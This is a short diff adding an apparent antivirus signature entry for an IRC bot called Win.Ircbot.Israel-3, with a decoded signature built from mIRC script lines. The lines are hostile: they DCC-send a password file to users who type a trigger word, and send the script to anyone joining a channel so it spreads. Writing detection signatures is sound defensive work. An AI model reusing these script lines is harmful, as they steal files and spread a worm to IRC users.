@@ -1,0 +1,10 @@
+VIRUS NAME: Win.Ircbot.Israel-3
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+ript]
+n0=ON 1:TEXT:*shirac*:#:/dcc send $nick c:\linux\etc\passwd.
+n1=;
+n2=on 1:JOIN:#:{
+n3= if ($me != $nick) {
+n4=     /dcc send $nick $mirc
